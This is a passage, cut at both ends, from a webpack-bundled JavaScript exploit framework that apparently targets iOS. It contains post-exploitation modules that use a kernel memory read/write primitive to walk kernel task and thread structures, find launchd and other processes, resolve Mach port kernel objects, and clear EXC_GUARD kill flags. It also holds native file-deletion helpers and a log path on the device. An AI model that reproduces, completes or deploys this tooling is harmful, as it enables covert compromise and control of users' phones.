O_CREAT | O_APPEND);\n\t}\n\n\tstatic deleteFile(path) {\n\t\tNative.callSymbol(\"unlink\", path);\n\t}\n\tstatic foreachDir(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\n\tstatic foreachFile(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t\treturn true;\n\t}\n\n\tstatic createDir(path, permission=0o755) {\n\t\treturn !Native.callSymbol(\"mkdir\", path, permission);\n\t}\n\n\tstatic deleteDir(path, recursive=false) {\n\t\tif (recursive) {\n\t\t\tconst dir = Native.callSymbol(\"opendir\", path);\n\t\t\tif (!dir) {\n\t\t\t\tconsole.log(TAG, \"deleteDir: Unable to open dir: \" + path);\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\twhile (true) {\n\t\t\t\tconst item = this.#readdir(dir);\n\t\t\t\tif (!item)\n\t\t\t\t\tbreak;\n\n\t\t\t\tconst newPath = path + '/' + item.d_name;\n\n\t\t\t\tswitch (item.d_type) {\n\t\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tthis.deleteDir(newPath, true);\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\t\tconsole.log(TAG, `deleting: ${newPath}`);\n\t\t\t\t\t\tthis.deleteFile(newPath);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\n\t\treturn !Native.callSymbol(\"rmdir\", path);\n\t}\n\n\tstatic exists(path, permission=0) {\n\t\treturn !Native.callSymbol(\"access\", path, permission);\n\t}\n\n\tstatic stat(path) {\n\t\tconst ret = Native.callSymbol(\"stat\", path, Native.mem);\n\t\tif (ret == ERROR)\n\t\t\treturn null;\n\t\tconst buff = Native.read(Native.mem, 144);\n\t\tconst view = new DataView(buff);\n\n\t\tconst dev = view.getInt32(0, true);\n\t\tconst mode = view.getUint16(0x4, true);\n\t\tconst nlink = view.getUint16(0x6, true);\n\t\tconst ino = view.getBigUint64(0x8, true);\n\t\tconst uid = view.getUint32(0x10, true);\n\t\tconst gid = view.getUint32(0x14, true);\n\t\tconst atime_tv_sec = view.getBigInt64(0x20, true);\n\t\tconst mtime_tv_sec = view.getBigInt64(0x30, true);\n\t\tconst ctime_tv_sec = view.getBigInt64(0x40, true);\n\t\tconst size = view.getBigInt64(0x60, true);\n\n\t\treturn {\n\t\t\tmode: Number(mode),\n\t\t\tino: Number(ino),\n\t\t\tdev: Number(dev),\n\t\t\tnlink: Number(nlink),\n\t\t\tuid: Number(uid),\n\t\t\tgid: Number(gid),\n\t\t\tsize: Number(size),\n\t\t\tatime: Number(atime_tv_sec),\n\t\t\tmtime: Number(mtime_tv_sec),\n\t\t\tctime: Number(ctime_tv_sec)\n\t\t};\n\t}\n\n\tstatic #readdir(dir) {\n\t\tconst itemPtr = Native.callSymbol(\"readdir\", dir);\n\t\tif (!itemPtr)\n\t\t\treturn null;\n\n\t\tconst item = Native.read(itemPtr, 24);\n\t\tconst view = new DataView(item);\n\n\t\tconst d_ino = view.getBigUint64(0, true);\n\t\tconst d_namlen = view.getUint16(18, true);\n\t\tconst d_type = view.getUint8(20);\n\t\tconst d_name = Native.readString(itemPtr + 21n, d_namlen + 1);\n\n\t\treturn {\n\t\t\td_ino: d_ino,\n\t\t\td_type: d_type,\n\t\t\td_name: d_name\n\t\t};\n\t}\n\n\tstatic #commonWriteFile(path, data, flags) {\n\t\tconst fd = Native.callSymbol(\"open\", path, flags, 0o644);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\t\n\t\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\t\tlet offs = 0;\n\t\tlet left = data.byteLength;\n\n\t\tconst buffSize = 0x4000;\n\t\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\t\twhile (true) {\n\t\t\tconst size = left > buffSize ? buffSize : left;\n\t\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\t\tconst dst8 = new Uint8Array(src8);\n\t\t\tNative.write(buffPtr, dst8.buffer);\n\t\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\t\tif (!len || len == ERROR)\n\t\t\t\tbreak;\n\t\t\toffs += len;\n\t\t\tleft -= len;\n\t\t\tif (!left)\n\t\t\t\tbreak;\n\t\t}\n\n\t\tNative.callSymbol(\"free\", buffPtr);\n\t\tNative.callSymbol(\"close\", fd);\n\n\t\treturn true;\n\t}\n}\n\n\n }),\n\n \"./src/libs/JSUtils/Logger.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Logger)\n });\n var _FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/JSUtils/FileUtils.js\");\n var _Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/Chain/Native.js\");\n\n\n\nclass Logger {\n\n\tstatic #logging = false;\n\tstatic #logfile = \"/private/var/mobile/Media/PostLogs.txt\";\n\n\tstatic {\n\t\t\n\t}\n\n\tstatic log(TAG, msg) {\n\t\t\n\t\tif (Logger.#logging)\n\t\t\treturn;\n\t\tLogger.#logging = true;\n\t\tconst logMsg = `[${TAG}] ${msg}`;\n\n\t\tLOG(logMsg);\n\n\t\tif (false) \n{}\n\t\tLogger.#logging = false;\n\t}\n\n\tstatic clearPreviousLogs(){\n\t\t_Chain_Native__WEBPACK_IMPORTED_MODULE_1__[\"default\"].callSymbol(\"unlink\", Logger.#logfile);\n\t}\n}\n\n\n }),\n\n \"./src/libs/JSUtils/Utils.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Utils)\n });\n\n\nconst TAG = \"UTILS\";\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nclass Utils {\n\n\tstatic UINT64_SIZE = 8;\n\tstatic UINT32_SIZE = 4;\n\tstatic UINT16_SIZE = 2;\n\tstatic ARM_THREAD_STATE64 = 6;\n\tstatic ARM_THREAD_STATE64_SIZE = 0x110;\n\tstatic ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);\n\tstatic ptrauth_key_asia = 0;\n\tstatic EXC_BAD_ACCESS = 1n;\n\tstatic EXC_GUARD = 12n;\n\tstatic EXC_MASK_GUARD = (1n << this.EXC_GUARD);\n\tstatic EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);\n\tstatic EXCEPTION_STATE = 2n;\n\tstatic MACH_EXCEPTION_CODES = 0x80000000n;\n\tstatic PAGE_SIZE = 0x4000n;\n\tstatic PAGE_MASK = (this.PAGE_SIZE - 1n);\n\n\tstatic hex(val) {\n\t\treturn val.toString(16);\n\t}\n\n\tstatic memmem(haystack, needle) {\n\t\tconst hLen = haystack.byteLength;\n\t\tconst nLen = needle.byteLength;\n\n\t\tif (nLen === 0 || hLen < nLen) {\n\t\t  return 0;\n\t\t}\n\n\t\tconst haystackView = new Uint8Array(haystack);\n\t\tconst needleView = new Uint8Array(needle);\n\n\t\tfor (let i = 0; i <= hLen - nLen; i++) {\n\t\t  let found = true;\n\t\t  for (let j = 0; j < nLen; j++) {\n\t\t\tif (haystackView[i + j] !== needleView[j]) {\n\t\t\t  found = false;\n\t\t\t  break;\n\t\t\t}\n\t\t  }\n\t\t  if (found) {\n\t\t\treturn i;\n\t\t  }\n\t\t}\n\n\t\treturn 0;\n\t}\n\n\tstatic ptrauth_string_discriminator(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbedn;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_string_discriminator_special(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481000000000000n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3000000000000n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbed000000000000n;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517000000000000n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_blend_discriminator(diver,discriminator)\n\t{\n\t\treturn diver & 0xFFFFFFFFFFFFn | discriminator;\n\t}\n\n    static printArrayBufferInChunks(buffer) {\n        const view = new DataView(buffer);\n        const chunkSize = 8;\n\n        for (let i = 0; i < buffer.byteLength; i += chunkSize) {\n\t\t\t\n\t\t\tconst chunk = view.getBigUint64(i, true); \n\n            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);\n        }\n    }\n\n\tstatic MIN(a, b)\n\t{\n\t\tif(a < b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n\n\tstatic MAX(a, b)\n\t{\n\t\tif(a > b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n}\n\n\n }),\n\n \"./src/libs/TaskRop/RegistersStruct.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( RegistersStruct)\n });\nconst TAG = \"REGISTERSSTRUCT\"\n\nclass RegistersStruct\n{\n\t#dataView;\n\n\tconstructor(buffer, offset = 0, length = 29) {\n\t\tthis.#dataView = new DataView(buffer,offset, length * 8);\n\t\tthis.length = length;\n\t}\n    \n\tget(index) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in get:${index}`);\n\t\t\treturn;\n        }\n        return this.#dataView.getBigUint64(index * 8, true); \n    }\n\n    set(index, value) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in set`);\n\t\t\treturn;\n        }\n        this.#dataView.setBigUint64(index * 8, BigInt(value), true); \n    }\n}\n\n }),\n\n \"./src/libs/TaskRop/SelfTaskStruct.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( SelfTaskStruct)\n });\nclass SelfTaskStruct \n{\n\t#buffer;\n\t#dataView;\n\tconstructor()\n\t{\n\t\tthis.#buffer = new ArrayBuffer(32);\n\t\tthis.#dataView = new DataView(this.#buffer);\n\t\tthis.addr = 0x0n;\n\t\tthis.spaceTable = 0x0n;\n\t\tthis.portObject = 0x0n;\n\t\tthis.launchdTask = 0x0n;\n\t}\n\tget addr()\n\t{\n\t\treturn this.#dataView.getBigUint64(0,true);\n\t}\n\tset addr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(0,value,true);\n\t}\n\tget spaceTable()\n\t{\n\t\treturn this.#dataView.getBigUint64(8,true);\n\t}\n\tset spaceTable(value)\n\t{\n\t\tthis.#dataView.setBigUint64(8,value,true);\n\t}\n\tget portObject()\n\t{\n\t\treturn this.#dataView.getBigUint64(16,true);\n\t}\n\tset portObject(value)\n\t{\n\t\tthis.#dataView.setBigUint64(16,value,true);\n\t}\n\tget launchdTask()\n\t{\n\t\treturn this.#dataView.getBigUint64(24,true);\n\t}\n\tset launchdTask(value)\n\t{\n\t\tthis.#dataView.setBigUint64(24,value,true);\n\t}\n}\n\n }),\n\n \"./src/libs/TaskRop/Task.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Task)\n });\n var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/TaskRop/SelfTaskStruct.js\");\n var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/JSUtils/Utils.js\");\n var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( \"./src/libs/Chain/Chain.js\");\n var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst TAG = \"TASK\"\nconst TASK_EXC_GUARD_MP_CORPSE = 0x40;\nconst TASK_EXC_GUARD_MP_FATAL = 0x80;\nconst TASK_EXC_GUARD_MP_DELIVER = 0x10;\n\nclass Task\n{\n\tstatic gSelfTask;\n\tstatic KALLOC_ARRAY_TYPE_SHIFT;\n\n\tstatic {\n\t\tthis.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t}\n\n\tstatic init(selfTaskAddr)\n\t{\n\t\t\n\t\tthis.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().T1SZ_BOOT - 1n));\n\n\t\t\n\t\tthis.gSelfTask.addr = selfTaskAddr;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\tthis.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);\n\t\tthis.gSelfTask.launchdTask = this.#searchForLaunchdTask();\n\n\t\tconsole.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.addr)}`);\n\t\tconsole.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(spaceTable)}`);\n\t\tconsole.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.portObject)}`);\n\t\tconsole.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.launchdTask)}`);\n\t}\n\n\tstatic trunc_page(addr)\n\t{\n\t\treturn addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic round_page(addr)\n\t{\n\t\treturn this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic pidof(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\t\treturn pid;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic getTaskAddrByPID(pid)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == pid)\n\t\t\t\treturn currTask;\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || (nextTask == currTask))\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic disableExcGuardKill(taskAddr)\n\t{\n\t\t\n\t\tlet excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard);\n\t\t\n\t\texcGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);\n\t\texcGuard |= TASK_EXC_GUARD_MP_DELIVER;\n\t\t\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard, excGuard);\n\t}\n\n\tstatic getTaskAddrByName(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\t\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\t\n\t\t\t\treturn currTask;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn false;\n\t}\n\n\tstatic getRightAddr(port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortEntry(spaceTable, port);\n\t}\n\n\tstatic #getSpaceTable(taskAddr)\n\t{\n\t\tlet space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().ipcSpace);\n\t\tlet spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().spaceTable);\n\t\t\n\t\t\n\t\tspaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(spaceTable);\n\t\t\n\t\treturn this.#kallocArrayDecodeAddr(BigInt(spaceTable));\n\t}\n\n\tstatic #mach_port_index(port)\n\t{\n\t\treturn ((port) >> 8n);\n\t}\n\n\tstatic #getPortEntry(spaceTable, port)\n\t{\n\t\tlet portIndex = this.#mach_port_index(port);\n\t\treturn spaceTable + (portIndex * 0x18n);\n\t}\n\n\tstatic #getPortObject(spaceTable, port)\n\t{\n\t\t\n\t\tlet portEntry = this.#getPortEntry(spaceTable, port);\n\t\t\n\t\tlet portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().entryObject);\n\t\t\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(portObject);\n\t}\n\n\tstatic getTaskProc(taskAddr)\n\t{\n\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().procRO);\n\t\tlet procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\treturn procAddr;\n\t}\n\n\tstatic #searchForLaunchdTask()\n\t{\n\t\t\n\n\t\tlet currTask = this.gSelfTask.addr;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == 1)\n\t\t\t\treturn currTask;\n\t\t\tlet prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().prevTask);\n\t\t\tif (!prevTask || prevTask === currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = prevTask;\n\t\t}\n\t\treturn 0n;\n\t}\n\n\tstatic #kallocArrayDecodeAddr(ptr)\n\t{\n\t\tlet zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);\n\t\tif (ptr & zone_mask)\n\t\t{\n\t\t\tptr &= ~0x1fn;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_MASK;\n\t\t\t\n\t\t\tptr |= zone_mask;\n\t\t\t\n\t\t}\n\t\treturn ptr;\n\t}\n\n\tstatic getPortAddr(port)\n\t{\n\t\tif (!port)\n\t\t\treturn 0;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n\n\tstatic getPortKObject(port)\n\t{\n\t\tlet portObject = this.getPortAddr(port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic #getPortKObjectByAddr(portObject)\n\t{\n\t\tif (!portObject)\n\t\t\treturn 0;\n\t\tlet kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().objectKObject);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(kobject);\n\t}\n\n\tstatic firstThread(taskAddr)\n\t{\n\t\tlet first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().threads);\n\t\treturn first;\n\t}\n\n\tstatic getMap(taskAddr)\n\t{\n\t\tlet vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().mapTask);\n\t\treturn vmMap;\n\t}\n\n\tstatic getPortKObjectOfTask(taskAddr,port)\n\t{\n\t\tlet portObject = this.getPortAddrOfTask(taskAddr, port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic getPortAddrOfTask(taskAddr, port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(taskAddr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n}\n\n\n }),\n\n \"./src/libs/TaskRop/TaskRop.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( TaskRop)\n });\n var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/Chain/Chain.js\");\n var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/JSUtils/Utils.js\");\n var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( \"./src/libs/TaskRop/Task.js\");\n\n\n\n\nconst TAG = \"TASKROP\"\n\nclass TaskRop\n{\n\tstatic init()\n\t{\n\t\tlet selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getSelfTaskAddr();\n\t\tif (!selfTaskAddr)\n\t\t{\n\t\t\tconsole.log(TAG,`Unable to find self task address`);\n\t\t\treturn;\n\t\t}\t\n\t\tconsole.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(selfTaskAddr)}`);\n\t\t_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].init(selfTaskAddr);\n\t}\n}\n\n }),\n\n \"./src/libs/TaskRop/Thread.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( Thread)\n });\n var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( \"./src/libs/Chain/Chain.js\");\n var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( \"./src/libs/JSUtils/Utils.js\");\n var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( \"./src/libs/TaskRop/ThreadState.js\");\n var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst AST_GUARD = 0x1000;\nconst TAG = \"THREAD\";\n\nclass Thread\n{\n\tstatic getTro(thread)\n\t{\n\t\tlet tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().tro);\n\t\t\n\t\tif (!(tro & 0xf000000000000000n))\n\t\t{\n\t\t\t\n\t\t\treturn 0n;\n\t\t}\n\t\treturn tro;\n\t}\n\tstatic getCtid(thread)\n\t{\n\t\tlet ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ctid);\n\t\treturn ctid;\n\t}\n\tstatic getTask(thread)\n\t{\n\t\tlet tro = this.getTro(thread);\n\t\t\n\t\tif (!(tro & 0xf000000000000000n) || tro === 0n)\n\t\t\treturn 0n;\n\t\tlet task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().troTask);\n\t\treturn task;\n\t}\n\tstatic next(thread)\n\t{\n\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads) < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\tlet next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads);\n\t\tif (next < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\treturn next;\n\t}\n\tstatic setMutex(thread,ctid)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData, ctid);\n\t}\n\tstatic 